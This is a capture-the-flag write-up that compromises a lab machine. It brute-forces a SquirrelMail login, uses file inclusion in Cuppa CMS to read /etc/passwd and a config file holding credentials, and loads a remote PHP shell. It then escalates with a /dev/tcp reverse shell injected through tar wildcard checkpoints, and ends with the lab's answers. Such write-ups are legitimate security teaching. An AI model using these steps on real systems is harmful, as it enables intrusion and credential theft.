The web page shows a form to be compiled, but it doesn't seem to do anything really <br />
![image](https://github.com/user-attachments/assets/59d941f8-a546-4dfb-b28a-2cb96b503cf1)<br />
A directory enumeration reveals some interesting directories: <br />
![image](https://github.com/user-attachments/assets/3fdd81c1-533f-428c-a568-b4a0ba575516)<br />
But for each of them we get a 403 Forbidden, except the last one, squirrelmail, lol. <br />
![image](https://github.com/user-attachments/assets/2c648ddb-3d5b-4444-a632-79cd2cdba4bd)<br />
This version is vulnerable to RCE by an authenticated attacker ([source](https://legalhackers.com/advisories/SquirrelMail-Exploit-Remote-Code-Exec-CVE-2017-7692-Vuln.html)): <br />
![image](https://github.com/user-attachments/assets/140dbc53-b486-4fee-ba8c-a38ffe37e645)<br />
I think the next step is to find a way to authenticate, we need to find some credentials. Let's try enumerating SMB shares. I used `enum4linux` for this task, and found something interesting: <br />
![image](https://github.com/user-attachments/assets/c067f4c0-3a22-4ef9-94f3-e3202e2221af)<br />
The target system has two local users: nobody and milesdyson. The output also shows the enumerated shares: <br />
![image](https://github.com/user-attachments/assets/9b3b21ed-a5b7-46b9-9360-64f85dfa4dc6)<br />
Let's try to access the anonymous share anonymously: `smbclient //10.10.190.140/anonymous -U anonymous -p 445`. I found an interesting file: <br />
![image](https://github.com/user-attachments/assets/962ab4d0-2a3c-4509-88e8-64764f95380b)<br />
Also if we access the logs folder, we are provided with 3 txt files: <br />
![image](https://github.com/user-attachments/assets/9e0de88a-536d-490d-91b4-7515b9b1357b)<br />
`log2.txt` and `log3.txt` are empty, but `log1.txt` contains a wordlists. At this point I think it's clear what we have to do: let's try to access Miles share using the given wordlist. I'll use hydra: `hydra -l milesdyson -P log1.txt smb://10.10.190.140 ` <br />
![image](https://github.com/user-attachments/assets/b6845aa7-7196-40ca-9ed3-025b9d50d922)<br />
Nope, this is not the right path. Next thing I wanna try is to bruteforce the squirrel mail login form using "milesdyson" as username, and the given wordlist as passwords. So first of all intercept the request using burpsuite, and set the password field as the target for intruder: <br />
![image](https://github.com/user-attachments/assets/3de3023a-f9e9-40a0-a5d2-ea27ed442b3e)<br />
Now go on "Payloads" and load our given wordlist as payload: <br />
![image](https://github.com/user-attachments/assets/c4fb84d3-25c9-45f8-9a3a-02d928954e82)<br />
Now start the attack. The very first thing I notiece is that the payload `cyborg007haloterminator` has different response parameters with respect to other payloads: <br />
![image](https://github.com/user-attachments/assets/62b45807-3564-4391-b06b-c8c15f8c147d)<br />
so I try to log in as `milesdyson:cyborg007haloterminator`, and it worked! <br />
![image](https://github.com/user-attachments/assets/dd896870-0b25-45bb-b8b9-04a8b9443494)<br />
There it is, in the first email there's the new SMB password for Miles: <br />
![image](https://github.com/user-attachments/assets/cd1e6d37-4126-46a6-8fd6-83471c3c20eb)<br />
Let's log in: `smbclient //10.10.190.140/milesdyson -U milesdyson -p 445`. There's a bunch of scientific pdf files, Miles must be some sort of AI teacher or something. After navigating a bit inside the share, i found a file named "important.txt" inside a directory called "notes": <br />
![image](https://github.com/user-attachments/assets/0e80c450-98f8-4f50-8f58-58d6ec257aa8)<br />
Let's download it and see what's in it. <br />
![image](https://github.com/user-attachments/assets/0ca23a05-0ed0-4624-b8ea-d255e58b69dc)<br />
Damn, Miles really cares about his wife. Anyway, let's access `http://target_IP/45kra24zxs28v3yd`: <br />
![image](https://github.com/user-attachments/assets/7e7a4d45-f47c-446f-aa17-f660336d81ee)<br />
Oh yes he is infact an AI specialist. The page itself seems empty, the source code doesn't contain any comments. Let's try some directory enumeration with `obuster dir -u http://10.10.190.140/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`. Yup, there's something there <br />
![image](https://github.com/user-attachments/assets/8cf719c1-1d90-4971-a17e-7f9ed064ede8)<br />
At this point I was stuck for a while, I didn't find anything, default credentials, sql Injection, etc. After a while I discovered that this version is vulnerable to File inclusion, even anauthenticated, [here](https://www.exploit-db.com/exploits/25971). <br />
![image](https://github.com/user-attachments/assets/52294868-bdee-44a7-86b2-ba222c2ea82d)<br />
So for example if we try to access `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd`, it actually works and shows us the /etc/passwd file. <br />
![image](https://github.com/user-attachments/assets/3dd36bb6-f73b-45fa-8feb-e089289ce502)<br />
Let's try downloading the configuration file: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php`. We get the following base64 encoded string in return. Decode it: 

      <?php 
      	class Configuration{
      		public $host = "localhost";
      		public $db = "cuppa";
      		public $user = "root";
      		public $password = "password123";
      		public $table_prefix = "cu_";
      		public $administrator_template = "default";
      		public $list_limit = 25;
      		public $token = "OBqIPqlFWf3X";
      		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
      		public $upload_default_path = "media/uploadsFiles";
      		public $maximum_file_size = "5242880";
      		public $secure_login = 0;
      		public $secure_login_value = "";
      		public $secure_login_redirect = "";
      	} 
And we got another set of credentials, `root:password123` These might be usefull later. Now let's try to include a malicious file from our own machine, let's call it shell.php (the code is provided in the file "shell.php" of this folder). Open a netcat listener `nc -lnvp 4444`, set up a web server with `python3 -m http.server 8000`, and upload it to the target machine with the following URL: `http://10.10.190.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.85.53:8000/shell.php`. There we go: <br />
![image](https://github.com/user-attachments/assets/f97120a9-1b82-4629-a34e-9a4818959216)<br />
![image](https://github.com/user-attachments/assets/a363b8d5-dd59-46cc-9082-160316c68c6b)<br />
And we have our user flag (the answers are all at the end of the writeup). Now let's stabilize the shell: 

            python3 -c 'import pty;pty.spawn("/bin/bash")'
            CTRL + Z
            stty raw -echo; fg
            export TERM=xterm
After some enumeration(I used linpeas), I found an interesting cron job: <br />
![image](https://github.com/user-attachments/assets/7eda4bd9-006b-45c3-8502-599cbae34fee)<br />
It runs every minute and it is owned by root. We also have read access to that file: <br />
![image](https://github.com/user-attachments/assets/acc04231-636e-448c-ab41-108fa5abd949)<br />
The command `tar cf /home/milesdyson/backups/backup.tgz *` will run a backup of all the files in the current directory. Since we are www-data, we have access to that directory. We can exploit this by using tar wildcards; move to `/var/www/html` and run the following commands: 

      echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" > shell.sh
      touch -- '--checkpoint=1'
      touch -- '--checkpoint-action=exec=bash shell.sh'
A "checkpoint" is essentially a tar option that tells tar to stop and do something. In particular we are telling tar to execute the reverse shell script. So open a netcat listener `nc -lnvp 4445` and wait a minute: <br />
![image](https://github.com/user-attachments/assets/cb10878b-3537-45c6-8a9c-dbb805c23b2d)<br />
We are root :)

                                                            
- What is Miles password for his emails? `cyborg007haloterminator`
- What is the hidden directory? `/45kra24zxs28v3yd`
- What is the vulnerability called when you can include a remote file for malicious purposes? `remote file inclusion `
